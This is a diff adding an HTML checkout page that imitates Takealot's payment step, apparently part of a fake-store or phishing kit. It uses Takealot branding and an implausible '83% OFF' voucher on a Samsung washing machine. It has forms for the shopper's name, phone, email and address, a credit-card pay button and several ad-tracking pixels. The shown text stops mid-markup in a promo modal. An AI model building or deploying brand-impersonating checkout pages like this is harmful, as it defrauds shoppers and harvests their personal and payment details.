@@ -1,0 +1,1569 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+
+<!-- UTM & Tracking Preservation System -->
+<script>
+(function() {
+  var TRACKING_KEYS = [
+    'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
+    'utm_id', 'src', 'sck', 'fbclid', 'gclid', 'ttclid'
+  ];
+
+  function getParamsFromUrl() {
+    var params = {};
+    try {
+      var search = window.location.search;
+      if (!search) return params;
+      var q = new URLSearchParams(search);
+      TRACKING_KEYS.forEach(function(k) {
+        var val = q.get(k);
+        if (val) params[k] = val;
+      });
+      q.forEach(function(val, key) {
+        if (key.indexOf('utm_') === 0 && !params[key]) {
+          params[key] = val;
+        }
+      });
+    } catch(e) {}
+    return params;
+  }
+
+  function saveParams(params) {
+    if (!params || Object.keys(params).length === 0) return;
+    try {
+      var stored = getStoredParams();
+      var merged = Object.assign({}, stored, params);
+      localStorage.setItem('takealot_utm_params', JSON.stringify(merged));
+      sessionStorage.setItem('takealot_utm_params', JSON.stringify(merged));
+      Object.keys(merged).forEach(function(k) {
+        localStorage.setItem(k, merged[k]);
+      });
+    } catch(e) {}
+  }
+
+  function getStoredParams() {
+    try {
+      var s = sessionStorage.getItem('takealot_utm_params') || localStorage.getItem('takealot_utm_params');
+      if (s) return JSON.parse(s);
+    } catch(e) {}
+    var fallback = {};
+    TRACKING_KEYS.forEach(function(k) {
+      try {
+        var v = localStorage.getItem(k);
+        if (v) fallback[k] = v;
+      } catch(e) {}
+    });
+    return fallback;
+  }
+
+  // Captura e persiste na inicialização imediata
+  var currentUrlParams = getParamsFromUrl();
+  if (Object.keys(currentUrlParams).length > 0) {
+    saveParams(currentUrlParams);
+  }
+
+  window.getPreservedUtms = function() {
+    return Object.assign({}, getStoredParams(), getParamsFromUrl());
+  };
+
+  window.getPreservedUtmQuery = function(includeLeadingAmp) {
+    var utms = window.getPreservedUtms();
+    var parts = [];
+    Object.keys(utms).forEach(function(k) {
+      parts.push(encodeURIComponent(k) + '=' + encodeURIComponent(utms[k]));
+    });
+    if (parts.length === 0) return '';
+    var str = parts.join('&');
+    return includeLeadingAmp !== false ? ('&' + str) : str;
+  };
+
+  window.appendUtms = function(url) {
+    if (!url || typeof url !== 'string') return url;
+    if (url.indexOf('javascript:') === 0 || url.indexOf('#') === 0 || url.indexOf('mailto:') === 0 || url.indexOf('tel:') === 0) {
+      return url;
+    }
+    var utms = window.getPreservedUtms();
+    if (Object.keys(utms).length === 0) return url;
+
+    try {
+      var hasProtocol = url.indexOf('http://') === 0 || url.indexOf('https://') === 0;
+      var base = hasProtocol ? url : 'http://local.fake/' + url.replace(/^\//, '');
+      var parsed = new URL(base);
+
+      Object.keys(utms).forEach(function(k) {
+        if (!parsed.searchParams.has(k)) {
+          parsed.searchParams.set(k, utms[k]);
+        }
+      });
+
+      if (hasProtocol) {
+        return parsed.toString();
+      } else {
+        var cleanPath = parsed.pathname.replace(/^\/local\.fake\/?/, '').replace(/^\//, '');
+        var prefix = (url.indexOf('/') === 0) ? '/' : '';
+        return prefix + cleanPath + parsed.search + parsed.hash;
+      }
+    } catch(e) {
+      var sep = url.indexOf('?') === -1 ? '?' : '&';
+      var q = window.getPreservedUtmQuery(false);
+      return q ? (url + sep + q) : url;
+    }
+  };
+
+  function decorateLinks() {
+    try {
+      var links = document.querySelectorAll('a[href]');
+      for (var i = 0; i < links.length; i++) {
+        var a = links[i];
+        var href = a.getAttribute('href');
+        if (href && (href.indexOf('.html') !== -1 || href === '/' || href.indexOf('?') !== -1)) {
+          if (href.indexOf('http') === -1 || href.indexOf(window.location.host) !== -1) {
+            a.setAttribute('href', window.appendUtms(href));
+          }
+        }
+      }
+    } catch(e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', decorateLinks);
+  } else {
+    decorateLinks();
+  }
+  if (window.MutationObserver) {
+    document.addEventListener('DOMContentLoaded', function() {
+      new MutationObserver(decorateLinks).observe(document.body, { childList: true, subtree: true });
+    });
+  }
+})();
+</script>
+<!-- End UTM & Tracking Preservation System -->
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3040652709472060');
+fbq('init', '1671642977776583');
+fbq('init', '1148570223701664');
+fbq('track', 'PageView');
+const chkOrderId = new URLSearchParams(window.location.search).get('order') || 'TAK-INIT';
+fbq('track', 'InitiateCheckout', {}, { eventID: chkOrderId });
+</script>
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3040652709472060&ev=PageView&noscript=1" />
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1671642977776583&ev=PageView&noscript=1" />
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1148570223701664&ev=PageView&noscript=1" />
+</noscript>
+<!-- End Meta Pixel Code -->
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment | Takealot</title>
+  <link rel="icon" type="image/svg+xml" href="imagens/takealot-logo.svg" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  
+
+  <style>
+    :root {
+      --takealot-blue: #0b79bf;
+      --takealot-blue-dark: #005a94;
+      --takealot-green: #168744;
+      --takealot-green-dark: #126e37;
+      --takealot-text: #222222;
+      --takealot-muted: #717171;
+      --takealot-border: #e5e5e5;
+      --takealot-bg: #f4f4f4;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body {
+      background: var(--takealot-bg);
+      color: var(--takealot-text);
+      padding-bottom: 96px;
+    }
+
+    /* Top Navigation Header (< Payment) */
+    header.checkout-top-nav {
+      background: #ffffff;
+      height: 48px;
+      padding: 0 16px;
+      border-bottom: 1px solid var(--takealot-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-back-btn {
+      color: var(--takealot-blue);
+      font-size: 20px;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      padding: 6px 10px 6px 0;
+    }
+
+    .header-page-title {
+      font-size: 16.5px;
+      font-weight: 700;
+      color: #111111;
+      text-align: center;
+      flex: 1;
+      margin-right: 20px; /* Balance back arrow */
+    }
+
+    /* Chevron Stepper (DELIVERY > PAYMENT > CONFIRMATION) */
+    .takealot-chevron-stepper {
+      display: flex;
+      height: 38px;
+      background: #f4f4f4;
+      border-bottom: 1px solid #e0e0e0;
+      margin-bottom: 10px;
+      overflow: hidden;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      align-items: stretch;
+    }
+
+    .chevron-tab {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      user-select: none;
+      cursor: pointer;
+    }
+
+    .chevron-tab.delivery-tab {
+      background: #ffffff;
+      color: var(--takealot-blue);
+      clip-path: polygon(0 0, calc(100% - 13px) 0, 100% 50%, calc(100% - 13px) 100%, 0 100%);
+      z-index: 1;
+      padding-right: 6px;
+    }
+
+    .chevron-tab.payment-tab {
+      background: #3a3f45;
+      color: #ffffff;
+      margin-left: -13px;
+      padding-left: 20px;
+      padding-right: 8px;
+      clip-path: polygon(0 0, calc(100% - 13px) 0, 100% 50%, calc(100% - 13px) 100%, 0 100%, 13px 50%);
+      z-index: 2;
+    }
+
+    .chevron-tab.confirmation-tab {
+      background: #f4f4f4;
+      color: #9e9e9e;
+      margin-left: -13px;
+      padding-left: 20px;
+      clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%, 13px 50%);
+      z-index: 1;
+    }
+
+    /* Section Headings */
+    .takealot-sec-header {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: var(--takealot-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 14px 16px 8px;
+    }
+
+    /* Full-width White Card Blocks */
+    .takealot-block {
+      background: #ffffff;
+      border-top: 1px solid var(--takealot-border);
+      border-bottom: 1px solid var(--takealot-border);
+      margin-bottom: 12px;
+    }
+
+    .block-row-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 16px;
+      font-size: 13.5px;
+      color: #222;
+    }
+
+    .block-row-item.clickable-row {
+      cursor: pointer;
+    }
+    .block-row-item.clickable-row:active {
+      background: #fafafa;
+    }
+
+    .block-sep {
+      height: 1px;
+      background: #f0f0f0;
+      margin: 0 16px;
+    }
+
+    .action-blue-link {
+      color: var(--takealot-blue);
+      font-weight: 700;
+      font-size: 13px;
+      text-transform: uppercase;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+    .action-blue-link:active {
+      opacity: 0.7;
+    }
+
+    /* Delivery Address Summary & Edit Form */
+    .address-summary-content {
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .addr-name-line {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 3px;
+    }
+    .addr-street-line {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.35;
+      margin-bottom: 4px;
+    }
+    .addr-del-badge {
+      font-size: 12px;
+      color: var(--takealot-green);
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* Address Form Input Styling */
+    .address-form-drawer {
+      padding: 14px 16px 18px;
+      background: #fafafa;
+      border-top: 1px solid #eee;
+    }
+    .form-group {
+      margin-bottom: 12px;
+    }
+    .form-group:last-child {
+      margin-bottom: 0;
+    }
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 5px;
+    }
+    .form-label .req {
+      color: #e02424;
+    }
+    .form-input, .form-select {
+      width: 100%;
+      height: 42px;
+      padding: 0 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 13.5px;
+      color: #222;
+      background: #fff;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+    .form-input:focus, .form-select:focus {
+      border-color: var(--takealot-blue);
+      box-shadow: 0 0 0 2px rgba(11, 121, 191, 0.15);
+    }
+    .form-input.invalid, .form-select.invalid {
+      border-color: #e02424;
+      background-color: #fff9f9;
+    }
+    .form-row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    .save-addr-btn {
+      width: 100%;
+      background: var(--takealot-blue);
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 13.5px;
+      font-weight: 700;
+      margin-top: 8px;
+      cursor: pointer;
+    }
+
+    /* Payment Method Section */
+    .pm-card-box {
+      padding: 14px 16px;
+    }
+    .pm-header-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .pm-title {
+      font-size: 14.5px;
+      font-weight: 700;
+      color: #111111;
+      margin-bottom: 0;
+    }
+    .pm-official-logos-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: nowrap;
+      overflow-x: visible;
+    }
+    .brand-logo-img {
+      object-fit: contain;
+      display: inline-block;
+      vertical-align: middle;
+      flex-shrink: 0;
+    }
+    .brand-logo-img.logo-visa {
+      height: 13.5px;
+    }
+    .brand-logo-img.logo-mastercard {
+      height: 18.5px;
+    }
+    .brand-logo-img.logo-amex {
+      height: 12.5px;
+    }
+    .brand-logo-img.logo-applepay {
+      height: 14.5px;
+    }
+    .brand-logo-img.logo-gpay {
+      height: 14.5px;
+    }
+    .brand-logo-img.logo-payfast {
+      height: 14px;
+    }
+
+    /* Order Summary Lines */
+    .summary-data-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13.5px;
+      color: #222222;
+      margin-bottom: 10px;
+    }
+    .summary-price-bold {
+      font-weight: 600;
+      color: #111111;
+    }
+    .dotted-sep {
+      border-top: 1px dashed #dcdcdc;
+      margin: 12px 0 10px;
+    }
+    .to-pay-row {
+      margin-bottom: 14px;
+      font-size: 14px;
+    }
+    .to-pay-label {
+      font-size: 14px;
+      font-weight: 800;
+      color: #111111;
+    }
+    .to-pay-amount {
+      font-size: 18px;
+      font-weight: 800;
+      color: var(--takealot-green);
+    }
+
+    /* Charity Donation Card */
+    .charity-card-box {
+      background: #fbfbfb;
+      border: 1px solid #e5e5e5;
+      border-radius: 8px;
+      padding: 11px 13px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      user-select: none;
+    }
+    .charity-card-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
+    }
+    .charity-radio-circle {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 1.5px solid #0b79bf;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: background 0.15s;
+    }
+    .charity-radio-circle.checked {
+      background: var(--takealot-blue);
+    }
+    .charity-radio-circle.checked::after {
+      content: '';
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #fff;
+    }
+    .charity-text-label {
+      font-size: 12.5px;
+      color: #333333;
+      font-weight: 500;
+      line-height: 1.35;
+    }
+    .charity-info-icon {
+      color: var(--takealot-green);
+      font-size: 15px;
+      padding-left: 8px;
+      cursor: pointer;
+    }
+
+    /* Order Review Section */
+    .order-review-main-status {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #111111;
+      margin-bottom: 3px;
+    }
+    .order-review-sub-status {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #717171;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    /* Product Review Drawer with Quantity Stepper */
+    .order-drawer-content {
+      padding: 12px 0 4px;
+      border-top: 1px solid #f0f0f0;
+      margin-top: 10px;
+    }
+    .drawer-prod-row {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+    .drawer-prod-row img {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      flex-shrink: 0;
+    }
+    .drawer-prod-info {
+      flex: 1;
+    }
+    .drawer-prod-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: #222;
+      line-height: 1.35;
+      margin-bottom: 4px;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+    .drawer-prod-price {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 6px;
+    }
+    .drawer-prod-price strong {
+      color: #111;
+      font-size: 13px;
+    }
+
+    /* Quantity Stepper Control */
+    .qty-control-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .qty-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+    }
+    .qty-stepper-box {
+      display: inline-flex;
+      align-items: center;
+      background: #fff;
+      border: 1px solid #cfcfcf;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .qty-step-btn {
+      background: #f8f9fa;
+      border: none;
+      width: 28px;
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--takealot-blue);
+      font-size: 11px;
+      cursor: pointer;
+    }
+    .qty-step-btn:disabled {
+      color: #bbb;
+      background: #fafafa;
+      cursor: not-allowed;
+    }
+    .qty-number-input {
+      width: 32px;
+      height: 26px;
+      border: none;
+      border-left: 1px solid #e5e5e5;
+      border-right: 1px solid #e5e5e5;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+      background: #fff;
+      outline: none;
+    }
+    .in-stock-tag {
+      font-size: 11.5px;
+      color: var(--takealot-green);
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* Fixed Bottom Pay Bar (PAY WITH CREDIT CARD) */
+    .takealot-bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #ffffff;
+      padding: 12px 16px;
+      border-top: 1px solid #e2e8f0;
+      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.06);
+      z-index: 100;
+      display: flex;
+      justify-content: center;
+    }
+
+    .takealot-green-pay-btn {
+      width: 100%;
+      max-width: 500px;
+      height: 48px;
+      background: var(--takealot-green);
+      color: #ffffff;
+      border: none;
+      border-radius: 24px;
+      font-size: 14.5px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(22, 135, 68, 0.28);
+      transition: background 0.15s, transform 0.1s;
+    }
+    .takealot-green-pay-btn:active {
+      transform: scale(0.99);
+      background: #126e37;
+    }
+
+    /* Toast Notification */
+    .takealot-toast {
+      position: fixed;
+      bottom: 75px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(33, 33, 33, 0.95);
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 20px;
+      font-size: 12.5px;
+      font-weight: 600;
+      z-index: 2500;
+      display: none;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+      white-space: nowrap;
+    }
+
+    /* Modal Sheet */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 2000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .modal-sheet-card {
+      background: #fff;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 360px;
+      padding: 20px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    }
+    .modal-sheet-card h3 {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #111;
+    }
+    .modal-sheet-card p {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.4;
+      margin-bottom: 14px;
+    }
+    .modal-sheet-card input {
+      width: 100%;
+      height: 40px;
+      padding: 0 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 13.5px;
+      margin-bottom: 14px;
+    }
+    .modal-btn-row {
+      display: flex;
+      gap: 10px;
+      justify-content: flex-end;
+    }
+    .modal-btn-row button {
+      padding: 8px 16px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .modal-cancel-btn {
+      background: #f0f0f0;
+      border: 1px solid #ddd;
+      color: #333;
+    }
+    .modal-action-btn {
+      background: var(--takealot-blue);
+      border: none;
+      color: #fff;
+    }
+
+    /* Processing Overlay */
+    .processing-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.94);
+      z-index: 3000;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 24px;
+    }
+    .spinner-takealot {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #e3e3e3;
+      border-top-color: var(--takealot-green);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 18px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .proc-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 6px;
+    }
+    .proc-desc {
+      font-size: 13px;
+      color: #666;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header (< Payment) -->
+  <header class="checkout-top-nav">
+    <a href="index.html" class="header-back-btn" title="Back to Store">
+      <i class="fas fa-chevron-left"></i>
+    </a>
+    <h1 class="header-page-title">Payment</h1>
+  </header>
+
+  <!-- Voucher Alert Banner -->
+  <div id="voucher-banner" style="display: none; background: #ecfdf5; border-bottom: 1px solid #a7f3d0; padding: 10px 16px; font-size: 13px; font-weight: 700; color: #065f46; text-align: center;">
+    🎉 Voucher <span id="voucher-banner-code">TAKE83</span> Applied &bull; 83% OFF Final Deal Active!
+  </div>
+
+  <!-- Takealot Chevron Stepper (DELIVERY > PAYMENT > CONFIRMATION) -->
+  <div class="takealot-chevron-stepper">
+    <div class="chevron-tab delivery-tab" onclick="toggleAddressEdit(true)">
+      DELIVERY
+    </div>
+    <div class="chevron-tab payment-tab">
+      PAYMENT
+    </div>
+    <div class="chevron-tab confirmation-tab">
+      CONFIRMATION
+    </div>
+  </div>
+
+  <!-- SECTION 1: DELIVERY ADDRESS -->
+  <div class="takealot-sec-header">DELIVERY ADDRESS</div>
+  <div class="takealot-block" id="delivery-address-container">
+    <!-- Collapsed Delivery Summary -->
+    <div class="address-summary-content" id="address-summary-content">
+      <div>
+        <div class="addr-name-line"><span id="summary-rec-name">Recipient Name</span> · <span id="summary-rec-phone">Mobile Phone</span></div>
+        <div class="addr-street-line" id="summary-rec-address">Street address, Suburb, City</div>
+        <div class="addr-del-badge"><i class="fas fa-truck-fast"></i> Next-Day Delivery: Tomorrow, 7am - 7pm (Free)</div>
+      </div>
+      <button type="button" class="action-blue-link" onclick="toggleAddressEdit(true)">CHANGE</button>
+    </div>
+
+    <!-- Expandable Address Entry / Edit Form -->
+    <form id="checkout-form" class="address-form-drawer" id="address-form-drawer" autocomplete="on" onsubmit="event.preventDefault(); saveAddressAndCollapse();" style="display: none;">
+      <div class="form-group">
+        <label class="form-label" for="cust-name">Recipient Full Name <span class="req">*</span></label>
+        <input type="text" id="cust-name" name="name" class="form-input" placeholder="e.g. Sipho Dlamini" autocomplete="shipping name" required />
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label class="form-label" for="cust-phone">Mobile Number <span class="req">*</span></label>
+          <input type="tel" id="cust-phone" name="tel" class="form-input" placeholder="082 123 4567" autocomplete="shipping tel" required />
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cust-email">Email Address <span class="req">*</span></label>
+          <input type="email" id="cust-email" name="email" class="form-input" placeholder="name@email.com" autocomplete="shipping email" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="cust-address">Street Address <span class="req">*</span></label>
+        <input type="text" id="cust-address" name="street-address" class="form-input" placeholder="e.g. 15 Long Street" autocomplete="shipping street-address" required />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="cust-building">Complex / Apartment (Optional)</label>
+        <input type="text" id="cust-building" name="address-line2" class="form-input" placeholder="e.g. Block B, Apt 304" autocomplete="shipping address-line2" />
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label class="form-label" for="cust-suburb">Suburb <span class="req">*</span></label>
+          <input type="text" id="cust-suburb" name="address-level3" class="form-input" placeholder="e.g. Gardens" autocomplete="shipping address-level3" required />
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cust-city">City / Town <span class="req">*</span></label>
+          <input type="text" id="cust-city" name="address-level2" class="form-input" placeholder="e.g. Cape Town" autocomplete="shipping address-level2" required />
+        </div>
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label class="form-label" for="cust-postal">Postal Code <span class="req">*</span></label>
+          <input type="text" id="cust-postal" name="postal-code" class="form-input" placeholder="8001" autocomplete="shipping postal-code" required />
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cust-province">Province <span class="req">*</span></label>
+          <select id="cust-province" name="address-level1" class="form-select" autocomplete="shipping address-level1" required>
+            <option value="Western Cape" selected>Western Cape</option>
+            <option value="Gauteng">Gauteng</option>
+            <option value="KwaZulu-Natal">KwaZulu-Natal</option>
+            <option value="Eastern Cape">Eastern Cape</option>
+            <option value="Free State">Free State</option>
+            <option value="Limpopo">Limpopo</option>
+            <option value="Mpumalanga">Mpumalanga</option>
+            <option value="North West">North West</option>
+            <option value="Northern Cape">Northern Cape</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Hidden Country for Browser Autofill -->
+      <input type="hidden" id="cust-country" name="country" value="ZA" autocomplete="shipping country" />
+
+      <button type="submit" class="save-addr-btn">Save &amp; Continue to Payment</button>
+    </form>
+  </div>
+
+  <!-- SECTION 2: PAYMENT METHOD (Single line logos row!) -->
+  <div class="takealot-sec-header">PAYMENT METHOD</div>
+  <div class="takealot-block">
+    <div class="pm-card-box">
+      <div class="pm-header-row">
+        <div class="pm-title">Credit &amp; Debit Card</div>
+        <button type="button" class="action-blue-link" onclick="showToast('Credit & Debit Card is active')">CHANGE</button>
+      </div>
+      <div class="pm-official-logos-row">
+        <img src="imagens/logo_visa.png" alt="Visa" class="brand-logo-img logo-visa" />
+        <img src="imagens/logo_mastercard.png" alt="Mastercard" class="brand-logo-img logo-mastercard" />
+        <img src="imagens/logo_amex.png" alt="American Express" class="brand-logo-img logo-amex" />
+        <img src="imagens/logo_applepay.png" alt="Apple Pay" class="brand-logo-img logo-applepay" />
+        <img src="imagens/logo_gpay.png" alt="Google Pay" class="brand-logo-img logo-gpay" />
+        <img src="imagens/logo_payfast.png" alt="Instant EFT by PayFast" class="brand-logo-img logo-payfast" />
+      </div>
+    </div>
+
+    <div class="block-sep"></div>
+
+    <div class="block-row-item clickable-row" onclick="openPromoModal('voucher')">
+      <span id="voucher-row-label">Add Gift Voucher or Coupon Code</span>
+      <span class="action-blue-link" id="voucher-row-action">Add</span>
+    </div>
+
+    <div class="block-sep"></div>
+
+    <div class="block-row-item clickable-row" onclick="openPromoModal('ebucks')">
+      <span>Earn eBucks</span>
+      <span class="action-blue-link">Earn</span>
+    </div>
+  </div>
+
+  <!-- SECTION 3: ORDER SUMMARY (Exact replica of user screenshot!) -->
+  <div class="takealot-sec-header">ORDER SUMMARY</div>
+  <div class="takealot-block" style="padding: 14px 16px;">
+    <div class="summary-data-row">
+      <span><span id="summary-items-count-text">1 Item</span></span>
+      <span class="summary-price-bold">R <span id="summary-items-amount">2,599</span></span>
+    </div>
+    <div class="summary-data-row">
+      <span>Delivery</span>
+      <span class="summary-price-bold" style="font-weight: 500;">Free</span>
+    </div>
+    <div class="summary-data-row" id="voucher-summary-row" style="display: none; color: #16a34a;">
+      <span>Promotional Voucher (<span id="voucher-summary-code">TAKE83</span>)</span>
+      <span class="summary-price-bold" style="color: #16a34a;">-83% APPLIED</span>
+    </div>
+
+    <div class="dotted-sep"></div>
+
+    <div class="summary-data-row to-pay-row">
+      <span class="to-pay-label">TO PAY:</span>
+      <span class="to-pay-amount">R <span id="summary-to-pay-val">2,599</span></span>
+    </div>
+
+    <!-- Beautiful Gate Children's Charity Box -->
+    <div class="charity-card-box" onclick="toggleCharity()">
+      <div class="charity-card-left">
+        <div class="charity-radio-circle" id="charity-radio"></div>
+        <span class="charity-text-label">Donate R 5 to Beautiful Gate Children's Charity</span>
+      </div>
+      <i class="fas fa-circle-info charity-info-icon" onclick="event.stopPropagation(); showCharityModal();" title="About Beautiful Gate"></i>
+    </div>
+  </div>
+
+  <!-- SECTION 4: ORDER REVIEW (Exact replica of user screenshot!) -->
+  <div class="takealot-sec-header">ORDER REVIEW</div>
+  <div class="takealot-block" style="padding: 14px 16px;">
+    <div class="block-row-item" style="padding: 0 0 10px 0;">
+      <div>
+        <div class="order-review-main-status">Takealot Distribution Centre</div>
+        <div class="order-review-sub-status">DELIVERY: Tomorrow, 7am - 7pm</div>
+      </div>
+      <button type="button" class="action-blue-link" id="show-details-btn" onclick="toggleOrderDetails()">Hide Details</button>
+    </div>
+
+    <div class="order-drawer-content" id="order-drawer-content" style="display: block;">
+      <div class="drawer-prod-row">
+        <img id="summary-img" src="imagens/samsung_washer_1_hero.jpg" alt="Samsung 9kg EcoBubble Front Loader Washing Machine" />
+        <div class="drawer-prod-info">
+          <div class="drawer-prod-title" id="summary-title">Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)</div>
+          <div class="drawer-prod-price">Price: <strong>R <span id="summary-unit-price">2,599</span></strong> each</div>
+          
+          <!-- Quantity Stepper -->
+          <div class="qty-control-row">
+            <span class="qty-label">Qty:</span>
+            <div class="qty-stepper-box">
+              <button type="button" class="qty-step-btn minus-btn" id="qty-minus-btn" onclick="updateOrderQty(-1)" disabled>
+                <i class="fas fa-minus"></i>
+              </button>
+              <input type="number" id="order-qty-input" class="qty-number-input" value="1" min="1" max="10" readonly />
+              <button type="button" class="qty-step-btn plus-btn" id="qty-plus-btn" onclick="updateOrderQty(1)">
+                <i class="fas fa-plus"></i>
+              </button>
+            </div>
+            <span class="in-stock-tag"><i class="fas fa-circle-check"></i> In Stock</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Fixed Bottom Pay Button (PAY WITH CREDIT CARD) -->
+  <div class="takealot-bottom-bar">
+    <button type="button" class="takealot-green-pay-btn" id="main-pay-btn" onclick="submitCheckoutForm()">
+      PAY WITH CREDIT CARD
+    </button>
+  </div>
+
+  <!-- Toast Notification -->
+  <div class="takealot-toast" id="takealot-toast"></div>
+
+  <!-- Promo Modal (Voucher / eBucks) -->
+  <div class="modal-overlay" id="promo-modal" onclick="closePromoModal(event)">
+    <div class="modal-sheet-card" onclick="event.stopPropagation()">
+      <h3 id="promo-modal-title">Add Gift Voucher or Coupon</h3>
+      <p id="promo-modal-desc">Enter your promotional voucher or coupon code below:</p>
+      <input type="text" id="promo-modal-input" placeholder="e.g. TAKEALOT100" />
+      <div class="modal-btn-row">
